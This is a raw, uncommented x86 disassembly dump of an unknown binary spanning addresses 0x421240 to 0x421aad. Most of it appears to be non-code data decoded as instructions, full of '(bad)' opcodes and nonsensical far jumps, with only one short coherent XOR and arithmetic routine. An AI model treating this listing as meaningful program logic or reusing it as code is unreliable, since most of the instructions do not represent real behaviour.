  421240:	sub    edi,DWORD PTR [esi+0x29]
  421243:	data16 or bl,BYTE PTR [eax+0x47]
  421247:	cmp    esp,DWORD PTR [ecx]
  421249:	aas    
  42124a:	pop    es
  42124b:	ins    BYTE PTR es:[edi],dx
  42124c:	xchg   esp,eax
  42124d:	lock pusha 
  42124f:	mov    dl,BYTE PTR [edx+0x48]
  421252:	pop    edx
  421253:	pop    ebx
  421254:	jo     0x421281
  421256:	adc    al,0x39
  421258:	mov    ah,0x44
  42125a:	and    DWORD PTR [ebx],ebx
  42125c:	and    eax,0xceeb500
  421261:	sub    BYTE PTR [ebp+0x3a96e538],bl
  421267:	mov    eax,0x5304431c
  42126c:	bswap  eax
  42126e:	mov    dh,0xa2
  421270:	mov    WORD PTR [edi],fs
  421272:	scas   al,BYTE PTR es:[edi]
  421273:	mov    ds:0xddfd6f40,al
  421278:	idiv   eax
  42127a:	inc    edx
  42127b:	es add al,0xb3
  42127e:	jmp    0xda40:0x65d1b3dd
  421285:	sbb    eax,0xab780188
  42128a:	xor    dh,BYTE PTR [edx+0x42]
  42128d:	ret    0xc4be
  421290:	in     eax,0x36
  421292:	cs scas eax,DWORD PTR es:[edi]
  421294:	outs   dx,BYTE PTR ds:[esi]
  421295:	push   ss
  421296:	or     eax,0x5216abf0
  42129b:	xchg   esp,eax
  42129c:	ins    DWORD PTR es:[edi],dx
  42129d:	sub    dl,BYTE PTR [edi]
  42129f:	mov    eax,ds:0x33031bcd
  4212a4:	fs jae 0x4212ca
  4212a7:	or     eax,0xac1cc4aa
  4212ac:	in     al,dx
  4212ad:	inc    ebp
  4212ae:	mov    al,ds:0xfc227e63
  4212b3:	inc    eax
  4212b4:	test   al,0x2
  4212b6:	and    BYTE PTR [ebp-0x28],0x37
  4212ba:	vpavgw xmm5,xmm7,XMMWORD PTR [ebx-0x7cd89c6a]
  4212c2:	jns    0x42124d
  4212c4:	jb     0x4212ab
  4212c6:	dec    esp
  4212c7:	xor    al,0x2b
  4212c9:	mov    edi,0x2983d3cb
  4212ce:	xlat   BYTE PTR ds:[ebx]
  4212cf:	add    DWORD PTR [ebp-0x6980ceb],esi
  4212d5:	ja     0x421283
  4212d7:	int3   
  4212d8:	mov    dh,0xab
  4212da:	or     esp,esp
  4212dc:	mov    esp,0xc2b3436
  4212e1:	dec    edi
  4212e2:	test   BYTE PTR [ebx+edi*8-0xbbb2330],cl
  4212e9:	je     0x42132f
  4212eb:	pop    ecx
  4212ec:	mov    ch,0x9b
  4212ee:	and    eax,0xf440c11e
  4212f3:	xchg   esi,eax
  4212f4:	sti    
  4212f5:	push   es
  4212f6:	push   edi
  4212f7:	es jno 0x4212cc
  4212fa:	add    eax,0xfd48e5d6
  4212ff:	push   cs
  421300:	jne    0x42128a
  421302:	stos   DWORD PTR es:[edi],eax
  421303:	addr16 in eax,dx
  421305:	aad    0xae
  421307:	sub    al,0xd1
  421309:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42130a:	pusha  
  42130b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42130c:	shl    DWORD PTR [ecx+0x79dad21c],0x70
  421313:	adc    al,0x57
  421315:	outs   dx,BYTE PTR ds:[esi]
  421316:	mov    bl,0x8f
  421318:	popa   
  421319:	and    cl,ch
  42131b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42131c:	retf   0x3a06
  42131f:	je     0x421393
  421321:	bound  ecx,QWORD PTR [edx]
  421323:	xor    eax,0x55e9a093
  421328:	and    ecx,edx
  42132a:	iret   
  42132b:	xchg   esp,eax
  42132c:	imul   edi,DWORD PTR [eax+0x62],0xffffffc3
  421330:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421331:	(bad)  
  421332:	out    0xb7,eax
  421334:	add    edx,eax
  421336:	cs dec ebp
  421338:	mov    cl,0x19
  42133a:	cmp    DWORD PTR [esi],eax
  42133c:	in     eax,0xce
  42133e:	sub    dl,bl
  421340:	jl     0x4212d7
  421342:	js     0x421344
  421344:	mov    edx,0x8f46ca08
  421349:	aad    0xfc
  42134b:	or     eax,0x30c03f30
  421350:	mov    esi,0xcfab8ec5
  421355:	push   esp
  421356:	push   0xffffff92
  421358:	mov    dl,0x1d
  42135a:	fcmovbe st,st(2)
  42135c:	shl    edi,1
  42135e:	inc    ebx
  42135f:	popa   
  421360:	cmp    BYTE PTR [ebp*1-0x75a313db],bl
  421367:	retf   0xdafd
  42136a:	pop    edi
  42136b:	(bad)  
  42136c:	icebp  
  42136d:	sub    DWORD PTR [edx+0x2bc01d4d],edx
  421373:	add    bh,BYTE PTR [edi]
  421375:	lock sub al,BYTE PTR [ebx+0x4fd5665]
  42137c:	dec    ebx
  42137d:	push   0xd3ce4465
  421382:	mov    ebx,0x685f9b3a
  421387:	repz enter 0x83a2,0xf5
  42138c:	ret    0x1bf1
  42138f:	in     al,dx
  421390:	and    ah,BYTE PTR [esi+0x3b143fe6]
  421396:	out    0xa5,al
  421398:	retf   0xcf7a
  42139b:	and    BYTE PTR [edi+0x17b485d4],0x62
  4213a2:	cdq    
  4213a3:	test   eax,0x98cf7b4d
  4213a8:	gs mov al,0x7e
  4213ab:	(bad)
  4213ae:	mov    edx,DWORD PTR [ebp-0x6a]
  4213b1:	sahf   
  4213b2:	xor    ebx,DWORD PTR [ebp-0x568b93df]
  4213b8:	nop
  4213b9:	sti    
  4213ba:	xchg   ecx,eax
  4213bb:	pop    ss
  4213bc:	aam    0x82
  4213be:	xchg   edx,eax
  4213bf:	mov    eax,0x3edbe84
  4213c4:	fs dec edi
  4213c6:	pop    esp
  4213c7:	fisttp QWORD PTR [ebp-0x67]
  4213ca:	mov    esi,0x211fb874
  4213cf:	push   esp
  4213d0:	jo     0x4213f2
  4213d2:	and    al,BYTE PTR ss:[edi]
  4213d5:	xor    ebp,esp
  4213d7:	out    dx,eax
  4213d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213d9:	push   ebx
  4213da:	pop    ds
  4213db:	mov    DWORD PTR [edx-0x76097fc7],ecx
  4213e1:	test   BYTE PTR [edi-0x4954c323],bl
  4213e7:	fsub   QWORD PTR cs:[eax+0x4a4f91bb]
  4213ee:	test   edx,ecx
  4213f0:	and    ah,BYTE PTR [esp+esi*2+0x25]
  4213f4:	mov    esi,0xd53fd59b
  4213f9:	xchg   esi,eax
  4213fa:	pop    esp
  4213fb:	mov    edx,0xcd390cbb
  421400:	or     eax,edi
  421402:	mov    bh,0x26
  421404:	mov    ds:0x83270287,eax
  421409:	cmp    ecx,DWORD PTR [eax+0x48]
  42140c:	jbe    0x4213ba
  42140e:	fimul  WORD PTR [ebx-0x37ccf7b3]
  421414:	add    ecx,esi
  421416:	jne    0x41f07f
  42141c:	jmp    0x421467
  421421:	mov    ecx,DWORD PTR [ebp+0x8]
  421424:	mov    edx,DWORD PTR [ebp-0x8]
  421427:	xor    ecx,eax
  421429:	xor    edx,eax
  42142b:	sub    ecx,edx
  42142d:	sub    ecx,esi
  42142f:	xor    ecx,eax
  421431:	mov    DWORD PTR [ebp+0x8],ecx
  421434:	mov    ecx,DWORD PTR [ebp+0x8]
  421437:	mov    edx,DWORD PTR [ebp+0x8]
  42143a:	xor    ecx,eax
  42143c:	imul   edx,edx,0x5708f5
  421442:	add    ecx,esi
  421444:	lea    ecx,[ebp+ecx*4-0x64]
  421448:	mov    edi,DWORD PTR [ecx]
  42144a:	add    edx,edi
  42144c:	mov    DWORD PTR [ecx],edx
  42144e:	mov    ecx,DWORD PTR [ebp+0x8]
  421451:	xor    ecx,eax
  421453:	add    ecx,esi
  421455:	jne    0x421421
  42145b:	mov    ecx,DWORD PTR [ebp-0x8]
  42145e:	xor    ecx,eax
  421460:	mov    eax,DWORD PTR [ebp+0x10]
  421463:	add    ecx,esi
  421465:	mov    DWORD PTR [eax],ecx
  421467:	pop    edi
  421468:	pop    esi
  421469:	pop    ebx
  42146a:	leave  
  42146b:	ret    0xc
  42146e:	pop    ss
  42146f:	or     al,0x84
  421471:	repz lahf 
  421473:	sti    
  421474:	ja     0x421462
  421476:	stos   BYTE PTR es:[edi],al
  421477:	mov    edx,0xd7c688e2
  42147c:	ficom  WORD PTR [ebp+0x77]
  42147f:	int    0x1
  421481:	add    BYTE PTR [ebx+0x0],bl
  421484:	add    BYTE PTR [eax],al
  421486:	cmc    
  421487:	test   al,0x39
  421489:	(bad)  [edx]
  42148c:	and    al,0xb1
  42148e:	fidivr WORD PTR [ebp-0x64]
  421491:	mov    ds:0xb218df10,al
  421496:	or     BYTE PTR [ebx+edx*4-0x7],dl
  42149a:	jae    0x4214f2
  42149c:	mov    BYTE PTR [ebx-0x3c1a8d6c],0xb5
  4214a3:	scas   al,BYTE PTR es:[edi]
  4214a4:	(bad)  
  4214a5:	sti    
  4214a6:	adc    edx,DWORD PTR [eax-0x733b5eba]
  4214ac:	shr    BYTE PTR [edx-0x7d],cl
  4214af:	push   ds
  4214b0:	jge    0x421499
  4214b2:	test   DWORD PTR [edi+0x9],ebp
  4214b5:	dec    edx
  4214b6:	aas    
  4214b7:	sti    
  4214b8:	cmp    DWORD PTR [edi+0x735c4ed1],edx
  4214be:	inc    edx
  4214bf:	xchg   BYTE PTR [edi],al
  4214c1:	daa    
  4214c2:	add    bl,ah
  4214c4:	popf   
  4214c5:	pop    es
  4214c6:	out    0x5e,al
  4214c8:	adc    al,0xb1
  4214ca:	ins    DWORD PTR es:[edi],dx
  4214cb:	push   cs
  4214cc:	cli    
  4214cd:	adc    esp,DWORD PTR [ebx-0x7a]
  4214d0:	arpl   WORD PTR [ebx+ebp*1+0x797f6884],si
  4214d7:	pop    edi
  4214d8:	xor    al,dh
  4214da:	mov    ch,0xd0
  4214dc:	mov    edi,0x4e320698
	...
  4214ed:	add    cl,dl
  4214ef:	sub    al,0x14
  4214f1:	adc    edi,ebp
  4214f3:	cmp    edx,edi
  4214f5:	out    dx,al
  4214f6:	pop    edi
  4214f7:	xchg   bx,ax
  4214f9:	push   0x1c594306
  4214fe:	ror    ch,cl
  421500:	add    DWORD PTR [eax],eax
  421502:	pop    ebx
  421503:	add    BYTE PTR [eax],al
  421505:	add    BYTE PTR [eax],dl
  421507:	cmp    ah,BYTE PTR [ebx]
  421509:	stc    
  42150a:	mov    ebx,0xc2d96f5e
  42150f:	lock daa 
  421511:	outs   dx,BYTE PTR ds:[esi]
  421512:	jg     0x42150e
  421514:	mov    edx,0x75568ef2
  421519:	test   DWORD PTR [edx-0x6ae51d80],edx
  42151f:	adc    eax,0x5d62b93c
  421524:	dec    esi
  421525:	icebp  
  421526:	dec    esp
  421527:	or     eax,0x7d02b992
  42152c:	mov    bl,0x2a
  42152e:	mov    ebx,0xcb3b5ee9
  421533:	ja     0x4214d5
  421535:	mov    al,0x2d
  421537:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421538:	(bad)  
  421539:	xchg   ecx,eax
  42153a:	mov    esi,0xf8d982a9
  42153f:	sub    BYTE PTR [ebx-0x32],0x84
  421543:	iret   
  421544:	out    0x1b,ax
  421547:	sub    DWORD PTR fs:[edi-0x2939d104],ebx
  42154e:	xchg   DWORD PTR [ebx],edx
  421550:	or     al,0xc7
  421552:	mov    fs,WORD PTR [esi-0x23651e60]
  421558:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421559:	(bad)  
  42155b:	inc    edi
  42155c:	pop    esi
  42155d:	rcl    DWORD PTR [edx+0x9cb0],1
	...
  42156b:	add    BYTE PTR [eax],al
  42156d:	add    BYTE PTR [edi],bl
  42156f:	sub    esp,DWORD PTR [eax-0x60404bc1]
  421575:	sub    eax,esi
  421577:	add    BYTE PTR [edi+eax*2-0x32dc2e76],0x2d
  42157f:	into   
  421580:	add    DWORD PTR [eax],eax
  421582:	pop    ebx
  421583:	add    BYTE PTR [eax],al
  421585:	add    dh,ah
  421587:	adc    eax,0x26e69a85
  42158c:	xchg   ecx,eax
  42158d:	test   eax,0x5601bde1
  421592:	(bad)  
  421594:	es (bad) 
  421596:	scas   eax,DWORD PTR es:[edi]
  421597:	xor    ah,cl
  421599:	fld    DWORD PTR [esi-0x79]
  42159c:	icebp  
  42159d:	not    BYTE PTR [ebx]
  42159f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4215a0:	test   ah,ah
  4215a2:	add    BYTE PTR [ebx],cl
  4215a4:	jl     0x421539
  4215a6:	cmp    edx,ecx
  4215a8:	orps   xmm3,XMMWORD PTR [ecx-0x16d02745]
  4215af:	sahf   
  4215b0:	(bad)  
  4215b1:	sbb    al,0xde
  4215b3:	shl    ecx,0xd0
  4215b6:	mov    DWORD PTR [edx+0x11],edx
  4215b9:	pop    es
  4215ba:	mov    ah,0xef
  4215bc:	xor    eax,0xc0ef09e3
  4215c1:	jp     0x4215f0
  4215c3:	sub    ch,dl
  4215c5:	dec    ebp
  4215c6:	(bad)  
  4215c7:	das    
  4215c8:	inc    eax
  4215c9:	mov    ebp,0x8e88bf9e
  4215ce:	ror    BYTE PTR [ebx-0x29],cl
  4215d1:	nop
  4215d2:	and    ecx,edi
  4215d4:	mov    cs,ebx
  4215d6:	pop    eax
  4215d7:	fs add al,0x4a
  4215da:	sub    ecx,DWORD PTR [ebx]
  4215dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4215dd:	sub    cl,BYTE PTR [esi-0x6a]
  4215e0:	jge    0x4215e2
	...
  4215ee:	das    
  4215ef:	and    al,0xf0
  4215f1:	aam    0xfb
  4215f3:	aam    0x2f
  4215f5:	jmp    FWORD PTR [esi+0x33]
  4215f8:	je     0x4215b0
  4215fa:	inc    esi
  4215fb:	or     ebx,DWORD PTR fs:[edi-0x78]
  4215ff:	into   
  421600:	add    DWORD PTR [eax],eax
  421602:	pop    ebx
  421603:	add    BYTE PTR [eax],al
  421605:	add    ch,ch
  421607:	sub    ebx,esi
  421609:	sbb    al,0xd3
  42160b:	clc    
  42160c:	adc    bl,BYTE PTR [eax-0x7]
  42160f:	inc    ebp
  421610:	aam    0x3a
  421612:	push   edi
  421613:	jp     0x421611
  421615:	xchg   DWORD PTR [ecx+0x7d],eax
  421618:	jmp    0xf7e8:0xb4d1ac79
  42161f:	mov    ch,0x9a
  421621:	mov    esi,0x9a71bbc5
  421626:	pop    ss
  421627:	xor    BYTE PTR ds:0x6437a525,0x39
  42162e:	scas   eax,DWORD PTR es:[edi]
  42162f:	adc    bl,BYTE PTR [ebx-0x21]
  421632:	mov    eax,0x45f81d19
  421637:	ins    BYTE PTR es:[edi],dx
  421638:	xor    DWORD PTR ds:0x71aaf0b5,ebx
  42163e:	mov    ds:0x705f8ea8,al
  421643:	cmc    
  421644:	loope  0x42169a
  421646:	and    eax,0xc98110f
  42164b:	cmp    BYTE PTR [edi-0x3c],ah
  42164e:	enter  0xac2a,0x5c
  421652:	popa   
  421653:	or     ecx,DWORD PTR [ecx+eax*1]
  421656:	push   esp
  421657:	jno    0x42163a
  421659:	loopne 0x4216ba
  42165b:	lods   eax,DWORD PTR gs:[esi]
  42165d:	mov    ebx,esp
  42165f:	mov    ch,ch
	...
  42166d:	add    dl,cl
  42166f:	mov    al,ds:0xdf7e4d76
  421674:	sti    
  421675:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421676:	mov    bh,0x83
  421678:	dec    edi
  421679:	mov    ds:0x60bc36ca,al
  42167e:	jecxz  0x42164e
  421680:	add    DWORD PTR [eax],eax
  421682:	pop    ebx
  421683:	add    BYTE PTR [eax],al
  421685:	add    BYTE PTR [edi+esi*1-0x286db059],cl
  42168c:	mov    bl,0x22
  42168e:	sub    edx,ebp
  421690:	or     DWORD PTR cs:[ecx-0x6e],eax
  421694:	and    cl,BYTE PTR [eax+0x76]
  421697:	imul   eax,edx,0xde6d4d3
  42169d:	das    
  42169e:	mov    ebx,0xc12e765f
  4216a3:	dec    BYTE PTR [edx]
  4216a5:	dec    ebp
  4216a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216a7:	clc    
  4216a8:	or     cl,cl
  4216aa:	mov    eax,ds:0x99647e2b
  4216af:	imul   ecx,DWORD PTR [esi],0x2dc7b19d
  4216b5:	mov    al,0x2a
  4216b7:	aam    0x6a
  4216b9:	jmp    0x421704
  4216bb:	push   esi
  4216bc:	add    eax,0x807ae571
  4216c1:	mov    dh,0xb0
  4216c3:	sub    ebx,DWORD PTR [esi+0x15]
  4216c6:	ror    DWORD PTR [edx],0x9c
  4216c9:	mov    bh,BYTE PTR [eax+edi*4+0x63]
  4216cd:	dec    ecx
  4216ce:	cmp    eax,0x82c23805
  4216d3:	fs push edx
  4216d5:	and    eax,0x2181cfb5
  4216da:	(bad)  [edx+ecx*1+0x123023db]
	...
  4216ed:	add    dh,al
  4216ef:	out    dx,al
  4216f0:	lods   al,BYTE PTR ds:[esi]
  4216f1:	cmp    ch,BYTE PTR [edx+edi*2+0x5223fed6]
  4216f8:	stc    
  4216f9:	stc    
  4216fa:	mov    edx,DWORD PTR [ebx-0x30c10b2d]
  421700:	add    DWORD PTR [eax],eax
  421702:	pop    ebx
  421703:	add    BYTE PTR [eax],al
  421705:	add    dl,ch
  421707:	shr    al,0x75
  42170a:	stc    
  42170b:	adc    eax,0x7d187a8b
  421710:	into   
  421711:	pop    ecx
  421712:	mov    cl,0xf6
  421714:	xchg   edx,eax
  421715:	daa    
  421716:	pop    es
  421717:	ror    DWORD PTR [eax-0x38e2f7a2],0x8d
  42171e:	push   es
  42171f:	nop
  421720:	sbb    dl,BYTE PTR [ebx-0x56]
  421723:	push   ebp
  421724:	aas    
  421725:	loopne 0x421798
  421727:	cli    
  421728:	mov    DWORD PTR [eax],esp
  42172a:	clc    
  42172b:	mov    cs,ebp
  42172d:	jmp    0x2f77:0x76b6d7f3
  421734:	out    0xf1,al
  421736:	add    ecx,DWORD PTR [edx]
  421738:	fld    QWORD PTR [ecx]
  42173a:	popa   
  42173b:	in     al,dx
  42173c:	sbb    BYTE PTR [edx+edx*4+0x30b8b294],cl
  421743:	ins    BYTE PTR es:[edi],dx
  421744:	add    BYTE PTR [esi-0x6b],bl
  421747:	ret    0x56b0
  42174a:	(bad)  
  42174c:	sti    
  42174d:	mov    esi,0x2e5783e8
  421752:	xor    ebx,DWORD PTR [esi+0x50]
  421755:	mov    ebx,DWORD PTR [ebx+0x6f6572f2]
  42175b:	jns    0x42177e
  42175d:	xor    dh,BYTE PTR [edx+0x3663]
	...
  42176b:	add    BYTE PTR [eax],al
  42176d:	add    BYTE PTR [edx+0x34],dl
  421770:	inc    eax
  421771:	gs data16 jne 0x4217ec
  421775:	aaa    
  421776:	push   0xf06a4e09
  42177b:	jl     0x421737
  42177d:	mov    bl,BYTE PTR [ecx+0x5b0001cf]
  421783:	add    BYTE PTR [eax],al
  421785:	add    bh,bl
  421787:	or     eax,0xa940209
  42178c:	bound  eax,QWORD PTR [ecx]
  42178e:	push   ebx
  42178f:	lods   al,BYTE PTR ds:[esi]
  421790:	pop    edi
  421791:	push   eax
  421792:	shl    DWORD PTR [ebp+edx*8-0x14bba07b],0xa
  42179a:	inc    esi
  42179b:	mov    al,0x4c
  42179d:	jo     0x42181d
  42179f:	fadd   QWORD PTR [esi]
  4217a1:	mov    dl,0x1
  4217a3:	cmp    BYTE PTR [edx+0x2d],cl
  4217a6:	jno    0x421810
  4217a8:	ret    
  4217a9:	sar    DWORD PTR [ebx],0x30
  4217ac:	pop    esi
  4217ad:	push   es
  4217ae:	shr    DWORD PTR [ecx+0x4951392e],0x81
  4217b5:	dec    esi
  4217b6:	mov    ebp,gs
  4217b8:	ret    
  4217b9:	add    ah,BYTE PTR [edx-0x66d8619d]
  4217bf:	mov    al,ds:0xc1ad8209
  4217c4:	(bad)  
  4217c5:	jmp    0x63c4f38a
  4217ca:	push   edi
  4217cb:	fsubr  st,st(2)
  4217cd:	outs   dx,BYTE PTR ds:[esi]
  4217ce:	dec    eax
  4217cf:	pop    ds
  4217d0:	test   dl,bl
  4217d2:	test   DWORD PTR [ebp-0x32885a88],esi
  4217d8:	or     ecx,eax
  4217da:	jns    0x4217f1
  4217dc:	push   0xba097697
	...
  4217ed:	add    BYTE PTR [edx],dl
  4217ef:	mov    edx,0xe6f8c6d8
  4217f4:	push   ds
  4217f5:	(bad)  
  4217f6:	adc    bl,dh
  4217f8:	cwde   
  4217f9:	out    dx,al
  4217fa:	pop    ecx
  4217fb:	lea    ebx,[edi+0x66]
  4217fe:	add    al,0xe1
  421800:	add    DWORD PTR [eax],eax
  421802:	pop    ebx
  421803:	add    BYTE PTR [eax],al
  421805:	add    BYTE PTR [edi-0x67],ch
  421808:	xlat   BYTE PTR ds:[ebx]
  421809:	mov    dl,0x7b
  42180b:	mov    ch,0xa8
  42180d:	jmp    0xd225:0x973e33f2
  421814:	push   DWORD PTR [esi+0x33d681cb]
  42181a:	xchg   edi,eax
  42181b:	int3   
  42181c:	and    al,0x56
  42181e:	addr16 jb 0x4217f7
  421821:	pop    ecx
  421822:	sahf   
  421823:	sbb    BYTE PTR [ebp+0xe],al
  421826:	dec    esp
  421827:	fdivr  DWORD PTR [ebx]
  421829:	test   BYTE PTR [edi+0x56fde9ea],cl
  42182f:	iret   
  421830:	call   0x9e84db56
  421835:	xchg   edx,eax
  421836:	fcmovb st,st(5)
  421838:	adc    edi,DWORD PTR [esi-0x6e]
  42183b:	push   esp
  42183c:	clc    
  42183d:	arpl   WORD PTR [esi*8-0x6d4e878b],di
  421844:	push   es
  421845:	adc    ecx,DWORD PTR [ebx+0x3f]
  421848:	stos   BYTE PTR es:[edi],al
  421849:	xchg   esi,eax
  42184a:	dec    edi
  42184b:	or     eax,0x3693cb43
  421850:	pop    es
  421851:	or     BYTE PTR [ebp+0x5245eeb1],dh
  421857:	adc    ecx,DWORD PTR [edx-0x4c71e925]
  42185d:	data16 ins BYTE PTR es:[edi],dx
  42185f:	and    eax,0x7f
	...
  42186c:	add    BYTE PTR [eax],al
  42186e:	dec    ecx
  42186f:	inc    esi
  421870:	sub    BYTE PTR [eax],dh
  421872:	das    
  421873:	jle    0x4218ce
  421875:	jg     0x42183d
  421877:	imul   esi,eax,0xffffffd5
  42187a:	pop    esp
  42187b:	push   eax
  42187c:	mov    ah,0xd
  42187e:	pop    edi
  42187f:	loope  0x421882
  421881:	add    BYTE PTR [ebx+0x0],bl
  421884:	add    BYTE PTR [eax],al
  421886:	jne    0x4218e0
  421888:	cdq    
  421889:	push   esp
  42188a:	out    0xcd,al
  42188c:	pusha  
  42188d:	push   ebx
  42188e:	loopne 0x4218a7
  421890:	retf   
  421891:	sbb    al,bl
  421893:	call   0x7d:0x5348facf
  42189a:	fwait
  42189b:	data16 jnp 0x421854
  42189e:	mov    edx,0xc40317f9
  4218a3:	or     edi,edi
  4218a5:	mov    eax,ds:0x3074f254
  4218aa:	fwait
  4218ab:	aas    
  4218ac:	shr    BYTE PTR [edx-0x76],cl
  4218af:	mov    edx,0x4aafdc4f
  4218b4:	add    esp,DWORD PTR [eax+0x69]
  4218b7:	mov    ebp,0x8243a68b
  4218bc:	push   ebx
  4218bd:	in     eax,0xe
  4218bf:	stc    
  4218c0:	ss nop
  4218c2:	jecxz  0x4218dc
  4218c4:	jb     0x421853
  4218c6:	std    
  4218c7:	jbe    0x421918
  4218c9:	ds out dx,eax
  4218cb:	or     dl,BYTE PTR ds:0x3a4aff70
  4218d1:	inc    edx
  4218d2:	ror    DWORD PTR [edi+0x5a],0xab
  4218d6:	mov    ds:0x1e3e6a49,al
  4218db:	lea    ebp,[edx-0x41]
  4218de:	or     bh,BYTE PTR [esp+ecx*8]
	...
  4218ed:	add    BYTE PTR [edi-0x3a],ah
  4218f0:	and    dh,dh
  4218f2:	mov    eax,ds:0xe7d7f7f6
  4218f7:	mov    eax,0x2162da72
  4218fc:	and    BYTE PTR [ecx],0xba
  4218ff:	loope  0x421902
  421901:	add    BYTE PTR [ebx+0x0],bl
  421904:	add    BYTE PTR [eax],al
  421906:	sub    ebx,DWORD PTR [edi*4-0x73fdddcf]
  42190d:	jmp    0x421930
  42190f:	inc    esp
  421910:	xchg   edi,eax
  421911:	fistp  QWORD PTR [edi+0x7fee91cf]
  421917:	push   esp
  421918:	icebp  
  421919:	arpl   dx,di
  42191b:	mov    esp,0x1d378d97
  421920:	data16 aas 
  421922:	adc    eax,0x33a4b65
  421927:	in     al,dx
  421928:	in     eax,dx
  421929:	lods   al,BYTE PTR ds:[esi]
  42192a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42192b:	aad    0x81
  42192d:	aaa    
  42192e:	jecxz  0x4218f4
  421930:	into   
  421931:	add    DWORD PTR [ebp+0x39],ebx
  421934:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421935:	mov    ecx,0x54f3b35c
  42193a:	push   0xffffff97
  42193c:	cmp    dl,BYTE PTR [ebx+0x4d925896]
  421942:	or     dh,BYTE PTR [edx+0x7af2002b]
  421948:	jb     0x421914
  42194a:	xchg   esi,eax
  42194b:	xor    dl,BYTE PTR [eax+ecx*2-0x26]
  42194f:	fidiv  DWORD PTR [ebx+0x1]
  421952:	mov    edx,DWORD PTR [edx-0x653f1df1]
  421958:	shl    DWORD PTR [ecx+ecx*4+0x5e],1
  42195c:	std    
  42195d:	scas   eax,DWORD PTR es:[edi]
  42195e:	jge    0x42197e
  421960:	and    al,BYTE PTR [eax]
	...
  42196e:	ret    
  42196f:	or     eax,0xefee66a6
  421974:	ret    
  421975:	lods   eax,DWORD PTR ds:[esi]
  421976:	sub    al,0xb8
  421978:	mov    ds:0x6338c147,eax
  42197d:	add    edx,DWORD PTR ds:0x5b0001e2
  421983:	add    BYTE PTR [eax],al
  421985:	add    ch,bl
  421987:	push   edx
  421988:	cld    
  421989:	mov    ebx,0xd1da6794
  42198e:	adc    edx,DWORD PTR [edx+ebp*8-0x4a]
  421992:	or     BYTE PTR [edx-0x4a4c52f5],bh
  421998:	and    eax,0x687daf2e
  42199d:	or     dh,BYTE PTR [esi-0x9]
  4219a0:	jae    0x4219d0
  4219a2:	jl     0x421a23
  4219a4:	in     al,0xf3
  4219a6:	push   ss
  4219a7:	jno    0x421967
  4219a9:	int    0xc0
  4219ab:	adc    bl,cl
  4219ad:	cmp    al,0x57
  4219af:	sar    BYTE PTR fs:[eax+0x73234b9e],cl
  4219b6:	lock push edi
  4219b8:	dec    eax
  4219b9:	mov    ecx,0xfd43f6e4
  4219be:	call   0xc983678a
  4219c3:	(bad)  
  4219c4:	test   eax,0x2d239b2d
  4219c9:	and    eax,0x569dd016
  4219ce:	jp     0x421a1d
  4219d0:	pop    ss
  4219d1:	add    edi,DWORD PTR [eax-0x1]
  4219d4:	out    dx,eax
  4219d5:	dec    ebx
  4219d6:	ins    BYTE PTR es:[edi],dx
  4219d7:	adc    dh,BYTE PTR [ebp+ecx*4-0x77bc5dad]
  4219de:	push   ds
  4219df:	push   es
  4219e0:	pop    ecx
	...
  4219ed:	add    cl,bl
  4219ef:	ret    0x4905
  4219f2:	pop    ds
  4219f3:	iret   
  4219f4:	fst    st(2)
  4219f6:	enter  0xf86f,0xd2
  4219fa:	mov    dl,0x98
  4219fc:	ret    
  4219fd:	call   0x55:0x1e270
  421a04:	add    BYTE PTR [eax],al
  421a06:	imul   ebp,DWORD PTR [ebx-0x7ccfec2f],0xb64d2224
  421a10:	es pusha 
  421a12:	pushf  
  421a13:	dec    esp
  421a14:	jmp    edi
  421a16:	(bad)
  421a1a:	bound  ecx,QWORD PTR [edi-0x6654cb2e]
  421a20:	dec    edx
  421a21:	sbb    al,0xae
  421a23:	cli    
  421a24:	out    dx,eax
  421a25:	pop    eax
  421a26:	test   al,0x55
  421a28:	sbb    eax,0x2100c90
  421a2d:	seto   BYTE PTR [eax+0x2d6aa4c0]
  421a34:	inc    edi
  421a35:	dec    esp
  421a36:	imul   ebx,DWORD PTR [eax-0xe],0xffffffd8
  421a3a:	xor    eax,0xe29c772c
  421a3f:	(bad)  
  421a41:	dec    esi
  421a42:	xchg   esp,eax
  421a43:	fld    QWORD PTR [edi]
  421a45:	mov    ah,0x33
  421a47:	jg     0x4219df
  421a49:	inc    edi
  421a4a:	jle    0x421a7b
  421a4c:	test   DWORD PTR [edx-0x21a7075b],esi
  421a52:	mov    esp,0xd102a624
  421a57:	mul    DWORD PTR [eax]
  421a59:	imul   eax,DWORD PTR ds:0x0,0x4004290
  421a63:	nop
  421a64:	inc    edx
  421a65:	add    BYTE PTR [eax],cl
  421a67:	nop
  421a68:	inc    edx
  421a69:	add    BYTE PTR [eax+edx*4],cl
  421a6c:	inc    edx
  421a6d:	add    BYTE PTR [eax],dl
  421a6f:	nop
  421a70:	inc    edx
  421a71:	add    BYTE PTR [eax+edx*4],dl
  421a74:	inc    edx
  421a75:	add    BYTE PTR [eax],bl
  421a77:	nop
  421a78:	inc    edx
  421a79:	add    BYTE PTR [eax+edx*4],bl
  421a7c:	inc    edx
  421a7d:	add    BYTE PTR [eax],al
  421a7f:	mov    al,ds:0xa0040042
  421a84:	inc    edx
  421a85:	add    BYTE PTR [eax],cl
  421a87:	mov    al,ds:0xa00c0042
  421a8c:	inc    edx
  421a8d:	add    BYTE PTR [eax],dl
  421a8f:	mov    al,ds:0xa0140042
  421a94:	inc    edx
  421a95:	add    BYTE PTR [eax],bl
  421a97:	mov    al,ds:0xa01c0042
  421a9c:	inc    edx
  421a9d:	add    BYTE PTR [eax],al
  421a9f:	mov    al,0x42
  421aa1:	add    BYTE PTR [eax+esi*4],al
  421aa4:	inc    edx
  421aa5:	add    BYTE PTR [eax],cl
  421aa7:	mov    al,0x42
  421aa9:	add    BYTE PTR [eax+esi*4],cl
  421aac:	inc    edx
  421aad:	add    BYTE PTR [eax],dl
